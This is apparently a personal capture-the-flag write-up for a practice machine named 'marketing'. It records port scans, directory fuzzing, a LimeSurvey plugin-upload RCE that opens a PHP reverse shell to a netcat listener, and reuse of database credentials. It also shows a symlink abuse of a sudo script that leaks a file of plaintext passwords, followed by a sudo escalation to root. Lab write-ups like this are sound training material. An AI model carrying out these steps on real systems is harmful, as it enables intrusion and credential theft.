## INFORMATION GATHERING
```bash
# IP ADDRESS
192.168.148.225
# HOSTNAME
marketing
# OPERATING SYSTEM
cat /etc/*-release
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=20.04
DISTRIB_CODENAME=focal
DISTRIB_DESCRIPTION="Ubuntu 20.04.4 LTS"
NAME="Ubuntu"
VERSION="20.04.4 LTS (Focal Fossa)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 20.04.4 LTS"

# CREDENTIALS  

```
## OPEN PORTS DETAILS
```bash
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.41 ((Ubuntu))
```
# ENUMERATION
## PORT 80
```bash
# Nmap
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.41 ((Ubuntu))
- http-title: marketing.pg - Digital Marketing for you!
- http-methods:| Supported Methods: GET POST OPTIONS HEAD
- http-server-header: Apache/2.4.41 (Ubuntu)

- Add marketing.pg to /etc/hosts 

- Fuzzing http://marketing.pg
sudo ffuf -c -w /usr/share/wordlists/dirb/common.txt -of md -o fuzz/ffuf-common -fc 403,404 -u $url/FUZZ
assets                  [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 40ms]                                                                                    
index.html              [Status: 200, Size: 18286, Words: 5946, Lines: 442, Duration: 41ms]                                                                               
old                     [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 44ms]                                                                                    
vendor                  [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 39ms]

- Found subdomain name - from marketing.pg/old/
- sudo curl -s $url/old/| grep -oP 'href="\K[^"]+' | less
customers-survey.marketing.pg

- Add customers-survey.marketing.pg to /etc/hosts

- Accessing customers-survey.marketing.pg
- Found LimeSurvey
	- Found Administrator email - admin@marketing.pg
- Fuzzing http://customers-survey.marketing.pg/FUZZ
sudo feroxbuster -w /usr/share/wordlists/dirb/common.txt -C 403,404 -o fuzz/feroxbuster-common.txt -t 20 -u $url/
admin                   [Status: 301, Size: 346, Words: 20, Lines: 10, Duration: 41ms]
assets                  [Status: 301, Size: 347, Words: 20, Lines: 10, Duration: 40ms]
index.php               [Status: 200, Size: 47972, Words: 18026, Lines: 1048, Duration: 61ms]
installer               [Status: 301, Size: 350, Words: 20, Lines: 10, Duration: 40ms]
LICENSE                 [Status: 200, Size: 49474, Words: 8494, Lines: 975, Duration: 40ms]
modules                 [Status: 301, Size: 348, Words: 20, Lines: 10, Duration: 40ms]
plugins                 [Status: 301, Size: 348, Words: 20, Lines: 10, Duration: 40ms]
tests                   [Status: 301, Size: 346, Words: 20, Lines: 10, Duration: 40ms]
themes                  [Status: 301, Size: 347, Words: 20, Lines: 10, Duration: 40ms]
tmp                     [Status: 301, Size: 344, Words: 20, Lines: 10, Duration: 39ms]
upload                  [Status: 301, Size: 347, Words: 20, Lines: 10, Duration: 41ms]       

- Login Page
http://customers-survey.marketing.pg/admin
- Google fu default credentials for Limesurvey
	- admin:password
	- Found Version 5.3.24
```
## PORT 22
```bash
# Nmap
22/tcp open ssh syn-ack ttl 61 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
```
## INITIAL FOOTHOLD
```bash
# Exploit 
- https://github.com/Y1LD1R1M-1337/Limesurvey-RCE

- Following the steps from exploit 
- shell.php (/usr/share/laudanum/php/php-reverse-shell.php)
sudo zip shell.zip shell.php config.xml 
  adding: shell.php (deflated 59%)
  adding: config.xml (deflated 56%)

- Upload the shell.zip to plugins and Install

- Access URL
sudo nc -nvlp 80
http://customers-survey.marketing.pg/upload/plugins/Y1LD1R1M/shell.php

# www-data shell
sudo nc -nvlp 80                                                                                              
[sudo] password for kali: 
listening on [any] 80 ...
connect to [192.168.45.190] from (UNKNOWN) [192.168.148.225] 40492
Linux marketing 5.4.0-122-generic #138-Ubuntu SMP Wed Jun 22 15:00:31 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
 11:03:00 up  1:22,  0 users,  load average: 0.05, 0.03, 0.01
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ 

```
## PRIVILEGE ESCALATION
```bash
- Users from /etc/passwd
root:x:0:0:root:/root:/bin/bash
t.miller:x:1000:1000::/home/t.miller:/bin/bash
m.sander:x:1001:1001::/home/m.sander:/bin/bash

- run linpeas.sh
- Found  /var/www/LimeSurvey/application/config/config.php: 
	- 'username' => 'limesurvey_user' 
	- 'password' => 'EzPwz2022_dev1$$23!!',

su t.miller
Password: EzPwz2022_dev1$$23!!

sudo -l
user may run the following commands on marketing:
    (m.sander) /usr/bin/sync.sh

cat /usr/bin/sync.sh
-----------------------------------------------------------------------------
#! /bin/bash
if [ -z $1 ]; then
    echo "error: note missing"
    exit
fi
note=$1
if [[ "$note" =~ .*m.sander.* ]]; then
    echo "error: forbidden"
    exit
fi
difference=$(diff /home/m.sander/personal/notes.txt $note)
if [[ -z $difference ]]; then
    echo "no update"
    exit
fi
echo "Difference: $difference"
cp $note /home/m.sander/personal/notes.txt
echo "[+] Updated."
---------------------------------------------------------------------------

- The script updates the text file give as argument to /home/m.sander/personal/notes.txt and runs a diff command

- Tried what privesc methods I know up until now - didn't work so checked the walkthrough mybad :( 
- learnt more privesc mindset
- following the walkthrough privesc

t.miller@marketing:~$ id
uid=1000(t.miller) gid=1000(t.miller) groups=1000(t.miller),24(cdrom),46(plugdev),50(staff),100(users),119(mlocate)

- Note t.miller belong to 119(mlocate) group
- search for files of group mlocate

find / -group mlocate 2>/dev/null
/var/lib/mlocate/mlocate.db
/usr/bin/mlocate

- Found /var/lib/mlocate/mlocate.db file
- since strings was not available on the machine 
- copied /var/lib/mlocate/mlocate.db to kali machine using scp
sudo scp -r t.miller@$ip:/var/lib/mlocate/mlocate.db ./
[sudo] password for kali: 
t.miller@192.168.148.225's password: 
mlocate.db 100% 4865KB   4.4MB/s   00:01 

- Using strings on mlocate.db file grep for personal keyword and 3 lines above and below the keyword personal

strings mlocate.db | grep personal -A 3 -B 3 | less 
- Found creds-for-2022.txt (it should be inside /home/m.sander/personal/)
- but if set the path containing words all m.sander the script /usr/bin/sync.sh shows "error: forbidden"
- Fix - create a link redirects to /home/m.sander/personal/creds-for-2022.txt
t.miller@marketing:~$ ln -sf /home/m.sander/personal/creds-for-2022.txt creds

- Now update the note.txt
t.miller@marketing:~$ sudo -u m.sander /usr/bin/sync.sh ./creds                                
Difference: Binary files /home/m.sander/personal/notes.txt and ./creds differ
[+] Updated. 

- and diff on notes.txt with another text file
t.miller@marketing:~$ sudo -u m.sander /usr/bin/sync.sh /tmp/test 
Difference: 1,8c1
< slack account:                       
< michael_sander@gmail.com - pa$$word@123$$4!!
<                       
< github:                                                                                                                                                                                    
< michael_sander@gmail.com - EzPwz2022_dev1$$23!!      
<                          
< gmail:        
< michael_sander@gmail.com - EzPwz2022_12345678#!
\ No newline at end of file
---
> helll
[+] Updated.

- Worked creds for m.sander : EzPwz2022_12345678#!

# Privesc to root
m.sander@marketing:/home/t.miller$ sudo -l
[sudo] password for m.sander: 
Matching Defaults entries for m.sander on marketing:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User m.sander may run the following commands on marketing:
    (ALL : ALL) ALL
m.sander@marketing:/home/t.miller$ sudo su
root@marketing:/home/t.miller# id
uid=0(root) gid=0(root) groups=0(root)

# root
```
# NOTE
```bash
- Improve your privesc methodology 
- look for sus groups and files
```

# ENUMERATION OUTPUTS
## NMAP
```bash
# Nmap 7.94SVN scan initiated Sat Nov 30 15:14:35 2024 as: /usr/lib/nmap/nmap -p- -sC -sV -vv -oN nmap/scan-script-version 192.168.148.225
Nmap scan report for 192.168.148.225
Host is up, received echo-reply ttl 61 (0.041s latency).
Scanned at 2024-11-30 15:14:37 IST for 23s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 62:36:1a:5c:d3:e3:7b:e1:70:f8:a3:b3:1c:4c:24:38 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDFR/u8yZrrxkDWw/8gy/fNFksvT+QIL8O/6eD8zVxwKwgBURa9uRtOC8Dk6P+ktLwXJ9oSUitZeXVWjijbehpZBVHvywEOj9nc0bmk0+M/DGGbr1etS7cDvRzRATUtMPxQfYhzXqHlZe6Q2GfA0c75uybUXxOha8CTdK0Iv/maUUaiaPv3LGebQ4CpNaXNQfYVpCdsxLn5MxFi+tfenn/4CinBPn1Ahnx499V1G0ANTaKLsEETjqaMd5jnmml2wH1GmKfKf/6FevWv0Q9Ylsi3x/ipkDpcQAMRQ/aw5NuSSDrGTdo0wRuuoEf5Ybenp9haPVxUAPHbEcMI2hdcP5B3Cd03qimMhHEkFXE8sTUxRKHG+hg7cF8On1EXZsH1fsVyrFAAoHRrap5CsubmNXT93EcK7lc65DbKgeqls643x0p/4WOUiLXFstm6X4JCdEyhvWmnYtL3qDKMuQbCwrCJGeDjoaZTjHXbpjSxSnvtO04RT84x2t8MThyeYO3kSyM=
|   256 ee:25:fc:23:66:05:c0:c1:ec:47:c6:bb:00:c7:4f:53 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNBWjceIJ9NSOLk8zk68zCychWoLxrcrsuJYy2C1pvpfOhVBrr8QBhYbJxzzGJ7DpuMT/DXiCwuLXdu0zeR4/Dk=
|   256 83:5c:51:ac:32:e5:3a:21:7c:f6:c2:cd:93:68:58:d8 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIG3LJwn9us7wxvkL0E6EEgOPG3P0fa0fRVuJuXeASZvs
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.41 ((Ubuntu))
|_http-title: marketing.pg - Digital Marketing for you!
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Nov 30 15:15:00 2024 -- 1 IP address (1 host up) scanned in 25.12 seconds

```

